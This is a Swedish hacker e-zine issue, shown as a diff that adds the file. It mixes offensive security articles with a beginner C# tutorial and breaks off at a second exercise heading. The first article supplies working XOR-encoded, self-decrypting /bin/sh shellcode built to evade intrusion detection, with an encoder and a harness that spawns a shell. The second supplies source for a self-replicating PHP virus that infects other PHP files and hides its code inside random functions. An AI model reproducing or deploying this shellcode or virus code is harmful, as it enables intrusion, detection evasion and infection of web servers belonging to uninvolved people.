@@ -1,0 +1,1444 @@
+[==============================================================================]
+          echo $hack. "FREEDOM OF SPEECH, USE IT OR LOSE IT!"  - = == ===- -===]
+            -      =     =    =   = ===   === == === == = = =========== -===- =]
+
+             ___ ___          __    __________.__               
+            /   |   \   ____ |  | __\____    /|__| ____   ____  
+           /    ~    \_/ ___\|  |/ /  /     / |  |/    \_/ __ \ 
+           \    Y    /\  \___|    <  /     /_ |  |   |  \  ___/ 
+            \___|_  /  \___  >__|_ \/_______ \|__|___|  /\___  >
+                  \/       \/     \/        \/        \/ 0x03\/ 
+
+================================================================================
+Index 
+================================================================================
+
+0x00 Intro .................................................................Anon
+
+0x01 SEMIPOLYMORPHIC SHELLCODES................................Nån anonym snubbe
+0x02 PHP-Virus, teori och praktik.........................................R34p3r
+0x03 Introduktion till C#, del 3..........................................Retard
+0x04 Introduktion till C#, del 3 - Uppgifter..............................Retard
+0x05 Introduktion till CUDA...............................................sasha^
+0x06 Tävling................................................................Anon
+
+0x07 Outro..................................................................Anon
+================================================================================
+Intro                                                                       Anon
+================================================================================
+Rakryggad och med blodigt svärd finner vi vår hjälte. Hans hår och skägg går
+i samma blonda nyans och hans torso bär märken av kamp. Hans ansikte är det
+av Otto Skorzeny. För hans fötter ligger själlösa kroppar, var och en bär
+märken av hans svärd. Vår hjältes namn är hckzine.
+
+Vår hjälte har ännu en gång tagit till vapen och resultatet låter inte vänta.
+I utgåva nummer tre finner vi inte bara blod, död och förstörelse utan även
+häpnadsväckande intressanta artiklar av våra allseende skribenter. Läs eller 
+förpassas till dödsriket. Hckzine för överlevnad!
+
+Tidigare har våra artiklar burit få spår av datasäkerhet. Skälen till detta
+är många, och även om jag själv bara är en kugge i maskineriet och därigenom 
+inte för allas talan uttalar jag mig om varför jag inte har skrivit någon sådan
+artikel. Jag har valt att inte skriva någon sådan artikel då mina mål har varit
+de av kreativitet. Jag finner datasäkerhet vara en iterativ och tråkig 
+sysselsättning, långt borta från nyskapandets vyer. Ta någons produkt, testa 
+tills fel hittas, utnyttja fel, repetera. Tveklöst är det resultatet man är 
+ute efter, få människor finner glädje i själva utövandet. 
+
+Retards C#-serie är inne på sin tredje vända och för er som tar era första steg
+in i programmeringens värld bör ni vid detta lag vara uppfyllda av glädje
+och entusiasm inför det ni nu kan åstadkomma.
+
+hckzine saknar maktstruktur (på samma sätt som en gräsmatta saknar höjd) och
+alla är välkomna till vårt brödraskap. Skriv en artikel idag! Ensam är svag.
+Låt oss nedkämpa svaghet! Tillsammans tågar vi mot seger. Seger över 
+förtryck, seger över inrutade mönster, seger över passivitet! Alltid framåt!
+Rörelsen måste upprätthållas till varje pris! Storma!
+
+Från det virtuella slagfältet där den oändliga kampen mellan kreativitetens 
+väktare och det inrutade mönstrets krafter för evigt pågår. Godnatt där ute, 
+vad ni än är.
+
+================================================================================
+0x01 SEMIPOLYMORPHIC SHELLCODES                                Nån anonym snubbe
+================================================================================
+I denna artikel kommer jag ta upp någonting jag valt att kalla semipolymorphic 
+shellcodes, dvs självmodifierande shellcodes (skalkod? Nej tack, datasvenska 
+ftl). Den skarpsynte läsaren förstår nog att det blir lite som en spin-off från
+ artikelförfattare swestres och hans text om självmodifierande kod i förra 
+numret av detta e-zine. Då hans text tog upp modifiering av instruktioner på 
+ett lispliknande sätt med målet att optimera programkoden så kommer jag
+fokusera på ett helt annat användningsområde, nämligen att lura IDS:er.
+
+Många IDS:er greppar efter exv. "/bin/sh" och andra karakteristiska strängar 
+som härrör en shellcode. Tekniken jag kommer beskriva handlar om hur man 
+skriver en enkel självmodifierande shellcode som dekrypterar (i dessa exempel 
+rör det sig mer om obfuskering än ren kryptering dock, men jag kommer ändå 
+använda mig av det uttrycket) sina strängar och processorinstruktioner direkt i
+minnet innan de exekveras. Denna teknik lurar flertalet av de IDS:er jag har 
+kommit i kontakt med, åtminstone vid just den här typen av filter. Jag har valt
+att tillägga prefixet "semi" eftersom jag inte anser att exemplen jag kommer 
+ge i denna artikel fyller de kriterier som krävs för att ordet "polymorfisk" 
+ska uppfyllas korrekt. Denna artikel beskriver hur tekniken fungerar på 
+IA32-arkitekturen körandes Linux. Saker kan variera rätt mycket om du kör något
+annat.
+
+Jag börjar med att kortfattat beskriva hur koden kommer fungera. Såhär kommer 
+den vara uppbyggd:
+
+-------------------------------------------------------------------------------
+|  kryptonyckel  |  polymorphic shellcode  |  krypterad shellcode + ev. padding 
+-------------------------------------------------------------------------------
+
+Det första segmentet innehåller en mov-instruktion som placerar vår 32 bitars 
+kryptonyckel i ESI-registret, sen fortsätter exekveringen av vår shellcode. 
+Denna shellcode kommer sedan att dekryptera den egentliga shellcoden med hjälp 
+av kryptonyckeln och sen lämna över stafettpinnen till denna kod. Jag har i 
+detta exemplet valt att använda ett klassiskt XOR-krypto med en 32 bitars 
+nyckel. Jag kommer därmed läsa in den krypterade shellcoden i block om fyra 
+bytes, därför kan en padding bestående av nops eller nullbytes vara nödvändig i
+slutet för att koden ska vara jämnt delbar med fyra. Jag har valt den här 
+metoden för att den är enkel att beskriva och för att man inte behöver oroa sig
+för nullbytes när man skriver själva shellcoden, vilket också är en positiv 
+effekt av den här tekniken. Vill ni utveckla den här tekniken ytterligare så 
+rekommenderar jag er att använda t ex RC4 som krypto och en implementation som 
+gör att även själva shellet i sig blir krypterat men det kommer inte tas upp i 
+den här artikeln.
+
+Låt oss börja med att strukturera upp vår kod:
+
+_shellcode:
+.key:
+     mov esi,0xeffeaffe
+.polymorphic_init:
+     jmp short offset_till_call
+     pop ecx
+.polymorphic:
+     ; KOD
+
+     call offset_till_pop
+_crypted:
+     db 0xf2,0xab...
+
+Nu har vi kört den klassiska metoden för att få tag på minnesadressen till den 
+krypterade shellcoden med hjälp av call. Vi placerar denna i ECX och nyckeln 
+(i detta fall 0xeffeaffe), som tidigare nämnt, i ESI. Med dessa två värden i 
+vår arsenal kan vi sedan sätta igång att dekryptera shellcodens innehåll:
+
+.polymorphic:
+     mov eax,[ecx]
+     xor eax,esi
+     mov [ecx],eax
+     add ecx,0x4
+     jmp short offset_till_polymorphic
+
+Vi betar av ett word i taget, ganska simpelt va? Som ni märker blir detta en 
+oändlig slinga så vi får slänga in ett gäng instruktioner som tar reda på ifall
+shellcoden är genomarbetad. Det finns en uppsjö metoder för detta men för 
+enkelhetens skull har jag valt att avsluta shellcoden med ett fingerprint. Jag 
+väljer 0xc0ffeeee. Vi får då följande:
+
+.polymorphic:
+     mov eax,[ecx]
+     cmp eax,0xc0ffeeee
+     je short offset_till_crypted
+     xor eax,esi
+     mov [ecx],eax
+     add ecx,0x4
+     jmp short offset_till_polymorphic
+
+Sådär. När vi läser in vår fingerprint så hoppar vi till _crypted, dvs den 
+numera färdigdekrypterade shellcoden. I annat fall fortsätter vi dekryptera. 
+För att undvika huvudräkning och/eller penna och papper så bygger vi ett enkelt
+C-program som krypterar valfri shellcode. I exemplet så rippar jag den 
+klassiska exec /bin/sh-koden från smashing the stack. Oftast är en sådan 
+shellcode värdelös i sammanhanget eftersom denna tekniken är riktad mot remote 
+exploits och det är sällan det räcker att exekvera /bin/sh remotely. Hur som 
+helst utgör den bra exempelkod och jag har valt att använda shellcoden före de 
+plockat bort nullbytesen för att demonstrera att det inte behövs när man kör 
+den här tekniken.
+
+#include <stdio.h>
+#include <stdlib.h>
+#define KEY 0xeffeaffe
+
+char sc1[] =
+        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3" 
+/* cred: aleph1@underground.org */
+        "\x90\x90\x90\x00\x00\x00"; /* padding */
+
+void dump_shellcode(char *shellcode, size_t size)
+{
+        int i;
+
+        for (i = 0; i < size; i++)
+                printf("0x%.02x,", (*(shellcode+i)&0xff));
+        printf("\n");
+        fflush(stdout);
+
+        return;
+}
+
+int main()
+{
+        int *src, *dst;
+        size_t size;
+        char *sc2;
+
+        size = sizeof(sc1)-4;
+        sc2 = (char *)malloc(size);
+        dst = (int *)sc2;
+
+        for (src = (int *)sc1; *src; src++)
+                *(dst++) = (int)*src^KEY;
+        dump_shellcode(sc2, size);
+        free(sc2);
+
+        return 0;
+}
+
+Ganska självförklarande kod. Shellcoden är som synes lite modifierad. Jag 
+paddade med tre nops för att få den jämnt delbar med fyra och avslutade den med
+ett nullword för att min fina slinga skulle lira ordentligt. Kör vi den får vi 
+följande resultat:
+
+user@zarathustra:~$ gcc a.c -o b; ./b
+0x15,0x85,0xa0,0x66,0x88,0xa7,0x38,0xa9,0xf9,0xaf,0x39,0xa9,0xf2,0xaf,0xfe,
+0xef,0xfe,0x17,0xf5,0xef,0xfe,0xaf,0x77,0x1c,0x73,0xe1,0xf6,0x62,0xa8,0xa3,
+0x33,0x6f,0x46,0xae,0xfe,0xef,0xfe,0x14,0xfe,0xef,0xfe,0xaf,0x33,0x6f,0x16,
+0x7e,0x01,0x10,0x01,0x80,0x9c,0x86,0x90,0x80,0x8d,0x87,0xfe,0x26,0x12,0xb2,
+0x3d,0x3f,0x6e,0x7f,
+user@zarathustra:~$
+
+Mycket vackert! Lägger vi ihop det vi har nu så får vi fram följande:
+
+_shellcode:
+.key:
+     mov esi,0xeffeaffe
+.polymorphic_init:
+     jmp short offset_till_call
+     pop ecx
+.polymorphic:
+     mov eax,[ecx]
+     cmp eax,0xc0ffeeee
+     je short offset_till_crypted
+     xor eax,esi
+     mov [ecx],eax
+     sub ecx,0xfffffffc
+     jmp short offset_till_polymorphic
+     call offset_till_pop
+.crypted:
+     db 0x15,0x85,0xa0,0x66,0x88,0xa7,0x38,0xa9,0xf9,0xaf,0x39,0xa9,0xf2,0xaf,
+0xfe,0xef
+     db 0xfe,0x17,0xf5,0xef,0xfe,0xaf,0x77,0x1c,0x73,0xe1,0xf6,0x62,0xa8,0xa3,
+0x33,0x6f
+     db 0x46,0xae,0xfe,0xef,0xfe,0x14,0xfe,0xef,0xfe,0xaf,0x33,0x6f,0x16,0x7e,
+0x01,0x10
+     db 0x01,0x80,0x9c,0x86,0x90,0x80,0x8d,0x87,0xfe,0x26,0x12,0xb2,0x3d,0x3f,
+0x6e,0x7f
+.fingerprint:
+     dw 0xc0ffeeee
+
+
+Vi tar och fyller i korrekta offset-värden (labels, gdb, huvudräkning, välj den
+metod som passar dig) och assemblerar vår kod. Notera att jag tog tillfället i 
+akt att ändra "add 4" mot "sub -4" för att slippa nullbytes. Kollar vi in den 
+i objdump borde den se ut ungefär såhär:
+
+...
+08048080 <_shellcode.key>:
+ 8048080:       be fe af fe ef          mov    $0xeffeaffe,%esi
+
+08048085 <_shellcode.polymorphic_init>:
+ 8048085:       eb 16                   jmp    804809d
+ 8048087:       59                      pop    %ecx
+
+08048088 <_shellcode.polymorphic>:
+ 8048088:       8b 01                   mov    (%ecx),%eax
+ 804808a:       3d ee ee ff c0          cmp    $0xc0ffeeee,%eax
+ 804808f:       74 11                   je     80480a2
+ 8048091:       31 f0                   xor    %esi,%eax
+ 8048093:       89 01                   mov    %eax,(%ecx)
+ 8048095:       81 e9 fc ff ff ff       sub    $0xfffffffc,%ecx
+ 804809b:       eb eb                   jmp    8048088
+ 804809d:       e8 e5 ff ff ff          call   8048087
+...
+
+Vår semipolymorphic shellcode är klar:
+
+     \xbe\xfe\xaf\xfe\xef\xeb\x16\x59\x8b\x01\x3d\xee\xee\xff\xc0\x74
+     \x11\x31\xf0\x89\x01\x81\xe9\xfc\xff\xff\xff\xeb\xeb\xe8\xe5\xff
+     \xff\xff
+
+34 söta små bytes. Den går säkert att optimera ordentligt men det får bli upp 
+till er läsare. Vi sätter ihop den med vår krypterade shellcode och lägger 
+till vår kaffeinspirerade fingerprint:
+
+     \xbe\xfe\xaf\xfe\xef\xeb\x16\x59\x8b\x01\x3d\xee\xee\xff\xc0\x74
+     \x11\x31\xf0\x89\x01\x81\xe9\xfc\xff\xff\xff\xeb\xeb\xe8\xe5\xff
+     \xff\xff\x15\x85\xa0\x66\x88\xa7\x38\xa9\xf9\xaf\x39\xa9\xf2\xaf
+     \xfe\xef\xfe\x17\xf5\xef\xfe\xaf\x77\x1c\x73\xe1\xf6\x62\xa8\xa3
+     \x33\x6f\x46\xae\xfe\xef\xfe\x14\xfe\xef\xfe\xaf\x33\x6f\x16\x7e
+     \x01\x10\x01\x80\x9c\x86\x90\x80\x8d\x87\xfe\x26\x12\xb2\x3d\x3f
+     \x6e\x7f\xee\xee\xff\xc0
+
+Och nu återstår bara att testa den:
+
+char shellcode[] =
+        "\xbe\xfe\xaf\xfe\xef\xeb\x16\x59\x8b\x01\x3d\xee\xee\xff\xc0\x74"
+        "\x11\x31\xf0\x89\x01\x81\xe9\xfc\xff\xff\xff\xeb\xeb\xe8\xe5\xff"
+        "\xff\xff\x15\x85\xa0\x66\x88\xa7\x38\xa9\xf9\xaf\x39\xa9\xf2\xaf"
+        "\xfe\xef\xfe\x17\xf5\xef\xfe\xaf\x77\x1c\x73\xe1\xf6\x62\xa8\xa3"
+        "\x33\x6f\x46\xae\xfe\xef\xfe\x14\xfe\xef\xfe\xaf\x33\x6f\x16\x7e"
+        "\x01\x10\x01\x80\x9c\x86\x90\x80\x8d\x87\xfe\x26\x12\xb2\x3d\x3f"
+        "\x6e\x7f\xee\xee\xff\xc0";
+
+int main()
+{
+        int (*spawn_shell)();
+
+        spawn_shell = (int (*)())shellcode;
+        spawn_shell();
+
+        return 0;
+}
+
+user@zarathustra:~$ gcc a.c -o b; ./b
+sh-3.1$ 
+
+Works like a charm!
+Slutligen vill jag bara påpeka att jag är väl medveten om att detta inte är 
+någon världsomvälvande ny teknik. Phrack publicerade någon liknande artikel 
+för flera år sedan. Jag har däremot aldrig sett någon svensk artikel som tar 
+upp ämnet; inte heller någon engelsk som förklarar tekniken såhär pass enkelt. 
+Förhoppningsvis kommer den någon till nytta på ett eller annat sätt.
+
+                  
+                                             
+================================================================================
+0x02 - PHP-Virus, teori och praktik                                       R34p3r
+================================================================================
+
+Inledning
+=========
+De flesta som läser detta lär veta vad PHP är. För er som inte vet det men ändå
+är intresserade av att fortsätta läsa så är PHP ett språk för att skapa 
+dynamiska hemsidor med. Dock är den här artikeln inte direkt menad för de som 
+sysslar med hemsidesutveckling i PHP, utan snarare de som är intresserad av hur 
+man skriver virus. Dessa får här en alternativ inblick i hur man kan använda
+lite mer "udda" språk och tillvägagångssätt för att skapa sig ett ändå relativt
+effektivt virus som kan både sprida sig och infektera andra filer.
+
+Detta är en artikelserie, hur många delar den kommer att bestå av får vi se, men
+nu i den första delen kommer vi bara skriva en liten lätt kod som infekterar
+andra filer och även börjar leta runt i andra mappar efter nya offer.
+
+Det kan även tilläggas, innan folk börjar flamea, att material till den här
+artikeln är hämtad dels från egna experiment, men även andra artiklar om
+virusskapande i både PHP och för andra språk.
+
+Vi bygger en kärna
+==================
+Så, nu när ni har fått en liten introduktion till vad artikeln ska handla om så
+är det väl på sin plats att börja.
+
+Här nedan ser ni ett första utkast till vårat virus kärna, dvs. den del som är
+nödvändig för att infektering ska fungera.
+
+<?php # phpv
+$string='<?php # '.strstr(fread(fopen(__FILE__,'r'), filesize(__FILE__)),
+'phpv');
+$curdir=opendir('.');
+while ($file = readdir($curdir)) {
+      if (strstr($file, '.php')) {
+           $victim=fopen($file, 'r+');
+            if (!strstr(fread($victim, filesize($file)), 'phpv')) {
+                  fwrite($victim, $string);
+            }
+      fclose($victim);
+      } 
+}
+closedir($curdir); 
+?>
+
+Är du inte så haj på PHP eller bara allmänt trög så fungerar koden ovan så här:
+      - Vi börjar med att skapa en sträng som vi senare ska använda
+        (strstr - Find first occurrence of a string)
+      - Vi öppnar den mapp vi för närvarande befinner oss i för att kunna kika
+        runt efter flera offer (mouhaha!)
+      - När vi väl har hittat en php-fil så är det dags att kika om denna är
+        infekterad (onödigt att infektera samma fil 26439535 gånger)
+      - Är den inte det så är det dags att plantera in vår lilla mysiga kod
+        som vi skapade tidigare.
+      - Därefter stänger vi filen och fortsätter vår lilla resa och upprepar
+        proceduren för nästkommande fil tills alla har genomsökts och
+        infekterats.
+
+Den igenkännare jag har valt för detta enkla virus är "phpv", dvs. återfinns
+den i en fil så klassas den som infekterad. Detta går naturligtvis bra att
+byta mot något annat, som kanske är ovanligare att hitta.
+
+Nu har vi alltså skapat ett virus som klarar av att infektera fler filer än
+sig själv, och på så sätt även sprida sig. Problemet vi har nu är att det är
+ganska lätt att se om en fil är infekterad då viruskoden alltid läggs längst
+ner i den infekterade phpfilen.
+
+Vad kan vi då göra åt detta? För att ytterligare försvåra upptäckandet av vår
+lilla kodsnutt. Jo, vi kan använda oss utav "Scrambled infection", vilket
+innebär att vi helt enkelt ser till att viruset placerar sig på helt
+slumpmässiga ställen i koden varje gång den infekteras.
+
+Detta kan vi göra på två sätt, endera använder vi det lättare sättet, vilket
+innebär att vi slumpar ut viruset på en plats i en fil efter ett avslutat
+kommando ";". Risken med detta är att vi rent teoretiskt sett kan borka koden
+rätt rejält om "vi" råkar lägga viruset på fel ställe, och det vill vi inte
+göra, inte nu iaf :) Därför finns det en annan teknik som vi också ska kika på
+där vi ersätter en funktion med vårat virus, och sedan lägger ett anrop till
+våran riktiga funktion efter viruskoden.
+
+Man ersätter helt enkelt anropet till den funktionen med viruskod och och låter
+retrerande kod ligga kvar efter vår lilla hemmasnickrade kod.
+
+Detta är lite mer komplicerat än det tidigare, men jag ska försöka så gott jag
+kan om vad som faktiskt händer. Först kör vi lite teori på vad som faktiskt
+behövs göras.
+
+Först behöver vi naturligtvis titta om filen är infekterad eller ej, och sen
+så kommer här en liten lista.
+      * Hitta alla möjliga entrypoints (dvs. funktioner)
+      * Hitta en funktion som vi ska använda oss av
+      * Läsa in funktionen vi ska ersätta
+      * Skriva dit våran nya viruskod
+      * Lägga till ett anrop till den gamla funktionen
+
+Detta kan man då göra så här:
+<?php
+$ln=16;
+$fh=fopen(__FILE__,'r');
+fseek($fh, $ln);
+$content=fread($fh, 1611);
+fclose($fh);
+$cd=opendir('.');
+while($f = readdir($cd)) {
+      if(strstr($f, '.php')) {
+            $offer=fopen($f, 'r+');
+            $ocont=fread($offer, filesize($f));
+            if(!strstr($ocont, 'phpv')) {
+                  $possible=0;
+                  $occont=$ocont;
+
+                  while(strstr($occont, 'function ')) {
+                        $occont=strstr($occont, 'unction ');
+                        $possible++;
+                  }
+
+                  $which=mt_rand(1,$possible);
+                  $occont=$ocont;
+                  while($which--) {
+                        $occont=strstr($occont, 'function ');
+                  }
+                  $occont=strstr($occont, '{');
+                  $before=strlen($ocont)-strlen($occont)+1;
+                  $check=0;
+                  $i=0;
+                  do {
+                       if($occont{$i}=='{') {
+                          $check++;
+                       }
+                       if($occont{$i++}=='}') {
+                              $check--;
+                         }
+                  }
+                  while($check);
+
+                  fseek($offer, $before);
+                  $funccont=fread($offer, $i+1);
+                  fseek($offer, $before+$i-1);
+                  $aftercont=fread($offer, filesize($f)-$before-$i
+                  -strlen(strstr($ocont, '?>')));
+                  $coundj=0;
+                  $newvar='';
+
+                  do {
+                        $newvar.=chr(mt_rand(97,122));
+                        $countj++;
+                  } 
+                  while($countj<mt_rand(5,15));
+
+                  rewind($offer);
+                  $beforecont=fread($offer, $before);
+                  rewind($offer);
+                  fwrite($offer, $beforecont.chr(13).chr(10).'$ln='.
+                        ($before+strlen($before)+9).';'.chr(13).chr(10).
+                        $content.chr(13).
+                  chr(10).$newvar.'(); }'.$aftercont.chr(13).chr(10).
+                        'function '
+                  .$newvar.'() {'.chr(13).chr(10).$funccont.'?'.'>');
+             }
+      }
+}
+?>
+
+Okej, detta är lite mer hitech än det förra. Vad vi gör i den första loopen är
+att hitta alla möjliga attackplatser i offrets kod, dvs alla
+funktionsdeklarationer.
+
+Sedan så tar vi helt enkelt och slumpar fram en plats där vi tänker placera vår
+kod, och börjar då läsa in vad som finns efter för att sedan kunna ersätta det
+med vår egna kod, utan att ändå påverka kodens funktionalitet. I den sista do-
+satsen så genereras vårat funktionsnamn fram genom att vi bara slumpar fram
+lite bokstäver hej vilt :)
+
+Nå, notera att detta endast är en introduktion, och det mesta här är baserat på
+tidigare skriven kod inom samma ämne då jag tycker dessa har sammanfattat det
+hela ganska bra.
+
+Det intressanta kommer vi till lite senare, men vad det är kommer jag inte ta
+nu.
+================================================================================
+0x03 Introduktion till C#, del 3                                          Retard
+================================================================================
+Förord
+------
+      Så då står vi här igen, nu inne i del tre av denna snabba introduktion
+    av C#. I denna del kommer vi att gå igenom hur de så kallade if- samt 
+    switch-satserna fungerar i C#. Som vanligt kommer jag att lämna lite
+    kontrolluppgifter så att du kan ge dig själv lite träning.
+
+If-satser
+---------
+    Som programmerare vill man inte alltid utföra samma uppgift hela tiden.
+    Istället kan det skilja sig mycket igenom vad användaren gjort tidigare i
+    programmet eller dylikt.
+      Vi tar en inloggning som ett exempel. Om användaren skriver rätt lösenord
+    och rätt användarnamn ska användaren komma vidare. Men annars ska h*n bli
+    utslängd.
+
+    För att kontrollera att ett villkor är uppfyllt eller ej finns det olika
+    jämförelseoperatorer till hjälp. Jag listar de vanligaste nedanför här.
+
+    .-----------------------------------------.
+    | Operator  | Förklaring                  |
+    .-----------------------------------------.
+    | ==        | Är lika med                 |
+    | !=        | Är inte lika med/skiljt     |
+    | <         | Är mindre än                |
+    | >         | Är större än                |
+    | <=        | Är mindre än eller lika med |
+    | >=        | Är större än eller lika med |
+    | &&        | Och                         |
+    | ||        | Eller                       |
+    .-----------------------------------------.
+
+    Att kunna dessa utantill i början är inte nödvändigt men allt eftersom att
+    du programmerar alla if-satser kommer du att lära dig dem, man behöver inte
+    sitta och plugga in dem för att komma ihåg dem, det kommer naturligt med
+    tiden.
+
+    I C# kan en if-sats se ut så här:
+
+    [kod]
+    int a = 2;
+    int b = 2;
+
+    if(a == b)
+    {
+      Console.WriteLine(a + "är lika med" + b);
+    }
+    [/kod]
+
+    Simpelt men man kan behöva gå igenom koden i alla fall. I de två första
+    raderna deklarerar vi två stycken vanliga integers. Den nästkommande raden
+    är raden som kontrollerar någonting, det vill säga, det är där vår
+    if-sats börjar. En if-sats inleds alltid med ordet if följt av
+    ett eller flera villkor inbundet innanför parentestecken.
+      I mitt fall kollar if-satsen om a är lika med b, om så är fallet skriver
+    mitt program ut koden som står innanför { och }
+
+    Om jag skulle vilja göra någonting annat om a INTE är lika med b i mitt
+    program kan man göra så här:
+
+    [kod]
+    int a = 12;
+    int b = 3;
+    int c = 12;
+
+    if(a == b)
+    {
+      Console.WriteLine(a + " är lika med " + b);
+    }
+    else if(a == c)
+    {
+      Console.WriteLine(a + " är lika med " + c);
+    }
+    [/kod]
+
+    Som du ser la jag till kod under den första if-satsen, men istället för att
+    skriva if igen är man tvungen att skriva else if. En direkt översättning av
+    "else if" blir "annars om". Det är ganska logiskt.
+      Om man nu inte har fler villkor, utan bara vill kolla om a är lika med b,
+    och om så inte är fallet (d.v.s, a kan vara vilket tal som helst) så ska
+    en text skrivas ut, så kan man skriva så här:
+
+    [kod]
+    if(a == b)
+    {
+      Console.WriteLine("Bra jobbat!");
+    }
+    else
+    {
+      Console.WriteLine("Någonting har gått snett till!");
+    }
+    [/kod]
+
+    Som du ser ska man inte skriva i några villkor över huvud taget när man 
+    endast använder else, så fort man behöver använda sig av villkor ska man 
+    använda sig av else if. 
+    Else används ifall man vill att någonting ska hända om inga av de andra
+    villkoren är uppfyllda.
+      Självklart kan du kombinera både if, else if samt else på samma gång.
+    Det viktigaste är bara att komma ihåg i vilken ordning de ska läggas i 
+    koden,
+    else if ska alltid skrivas före else, då else tar hand om allt annat som
+    inte omfattas av de andra villkoren ska det skrivas sist av allt.
+
+    Låt oss säga att vi har två strängar, den första strängen är ett 
+    användarnamn och den andra strängen är ett lösenord. Om vi nu vill se till
+    att en användare skriver in rätt användarnamn och lösenord kan man använda
+    sig av det vi lärt oss tidigare, samtidigt som vi lär oss lite mer om
+    våra if-satser.
+      Jag börjar med att visa min kod så förklarar jag den senare.
+
+    [kod]
+    string usr = "Retard";
+    string pw = "Hdbim?";
+
+    Console.WriteLine("Skriv in ditt användarnamn:");
+    string usrinput = Console.ReadLine();
+    Console.WriteLine("Skriv in ditt hemliga lösenord:");
+    string pwinput = Console.ReadLine();
+
+    if (usrinput == usr && pwinput == pw) // stämmer allt?
+    {
+      Console.WriteLine("Välkommen in i värmen, " + usr);
+    }
+    else if(usrinput == usr && pwinput != pw) // är usrname rätt men pw fel?
+    {
+      Console.WriteLine("Kontrollera att du har lösenordet korrekt skrivet!"); 
+    }
+    else if(usrinput != usr && pwinput == pw) // Är pass rätt men inte usrname?
+    {
+      Console.WriteLine("Kontrollera ditt användarnamn!");
+    }
+    else // I alla andra fall, dvs att allt är fel.
+    {
+      Console.WriteLine("Kontrollera alla dina uppgifter!");
+    }
+    [/kod]
+
+    Som vanligt börjar jag att deklarera lite variabler i koden, i detta program
+    hårdkodar jag användarnamnet och lösenordet i två olika variabler. Därefter
+    använder jag mig av ReadLine() för att få information av användaren, i detta
+    fall är det självklart användarnamnet och lösenordet vi vill ha.
+      När användaren skrivit in dessa två olika värden har börjar vi kontrollera
+    dem, i alla dessa satser använder jag mig av två tecken för att separera
+    pwinput och usrinput, de två &-tecknen betyder "och".
+    I det första fallet blir det därför: "Om usrinput är lika med usr och
+    pwinput är lika med pw" följt av koden som ska hända om dessa två villkor
+    är sanna.
+
+    Som programmerare vill man dock undvika att skriva programmet vi har skrivit
+    ovan, för det första vill man väldigt sällan hårdkoda in användarnamn och
+    lösenord i koden då en eventuell elaking kan reverse-engineera fram dina
+    uppgifter. Allt detta görs mycket lättare i C# då man genom ett par musklick
+    kan ta reda på hela koden som skrivits.
+     Ytterligare fel kan vara att man berättar för användaren vad den skrivit in
+    för felaktigt värde, man kan då hjälpa en eventuell bruteforce-attack eller
+    manuell gissning.
+
+switch-satser
+-------------
+    En switch-sats kan användas som ersättare för if-satser om man vill. Jag
+    använder mig personligen väldigt sällan av switch-satser, men det är lika
+    viktigt att veta hur det fungerar för att kunna läsa och förstå andras kod
+    för att kanske göra förbättringar i den vid ett senare skede.
+
+    [kod]
+    Console.WriteLine("Skriv in ett tal, plox");
+    int n = int.Parse(Console.ReadLine());
+    switch (n) // här börjar vi vår switch-sats
+      {
+      case 1: // är n lika med 1?
+      Console.WriteLine("DET ÄR ETT!");
+      break; // hoppa ut ur switch-satsen
+                  
+      case 3: // är n lika med 3?
+      Console.WriteLine("DET ÄR TRE OMG!");
+      goto case 1; // hoppa in i koden som finns inom case 1.
+      }
+    [/kod]
+
+    Som du ser i kodsnutten ovan ser det inte alls ut som i en vanlig if-sats.
+    Jag börjar koden med att be användaren mata in ett tal. Sedan kommer vi in
+    på switch-satsen, vi börjar därför med att skriva switch följt av ett
+    parentestecken, innanför skriver vi vad det är vi vill kontrollera. I detta
+    fallet ville vi kontrollera vår integer som användaren fick bestämma värdet
+    på.
+      Vi börjar som vanligt med våra { och } tecken för att visa att innanför
+    dessa kommer vi att jobba med switch-satsen.
+    Sedan skriver vi case 1: (notera att det nu är ett kolon och inte ett
+    semikolon som vi brukar använda oss av)
+    Det vi gör när vi skriver case 1: är att vi kollar om integerns värde är
+    satt till 1, om så är fallet fortsätter vi nedanför, om det INTE är ett,
+    går vi vidare till nästa case.
+      Men om värdet på n nu i själva verket ÄR ett, kommer detta att hända:
+    * Är n lika med 1? - Ja
+    * Skriv ut: "DET ÄR ETT!" i konsolen.
+    * Avbryt.
+
+    Det "break;" gör är att den gör att programmet går ur switch-satsen och
+    går vidare in i nästa kodblock istället.
+
+    Om vi testar programmet, skriver in 1 som värde kommer vi att se en text som
+    säger: "DET ÄR ETT!". Men om vi istället skriver in 3, kommer vi att se
+    detta:
+      DET ÄR TRE OMG!
+      DET ÄR ETT!
+
+    Anledningen är för att vi började i case 3 denna gång, i case 3 har vi
+    en speciell rad som gör att vi hoppar in till case 1s kod när vi är 
+    färdiga. 
+    Först skriver vi ut att värdet är tre till användaren. Efter detta kör vi:
+    "goto case 1;", vilket betyder att vi hoppar in i case 1, oavsett om värdet
+    nu faktiskt ÄR ett eller inte.
+
+    Notera att goto ofta anses vara fulkod, och bör undvikas till det yttersta.
+    Det går att få samma resultat utan att använda goto. 
+    I mitt exempel har jag använt integers för att demonstrera switch-satserna,
+    men du skulle lika gärna kunna använda switch-satserna mot strängar du har
+    eller liknande.
+
+================================================================================
+0x04 Introduktion till C#, del 3 - uppgifter                              Retard
+================================================================================
+Förord
+------
+    Sådär, nu hoppas jag att du lärt dig en del om if-satser, för att kolla
+    dig själv kommer du nu att få lite uppgifter. Lycka till, och kom ihåg att
+    om du inte klarar en uppgift är det inte fel att fråga google eller läsa om
+    det jag skrivit i mina texter.
+
+Uppgift ett
+-----------
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |1                                               |^|
+      |Tryck på valfri tangent för att fortsätta...    | |
+      |                                                | |
+      |                                                | |
+      |                                                |v|
+      .--------------------------------------------------.
+
+        eller
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Värdet är två                                   |^|
+      |Tryck på valfri tangent för att fortsätta...    | |
+      |                                                | |
+      |                                                | |
+      |                                                |v|
+      .--------------------------------------------------.
+      Förklaring: Skapa en integer med värdet 1. Gör en kontroll som kollar
+        ifall integern har värdet 2, i annat fall får den skriva ut sitt eget
+        värde. Om den har värdet två ska den skriva ut: "Värdet är två".
+
+Uppgift två
+-----------
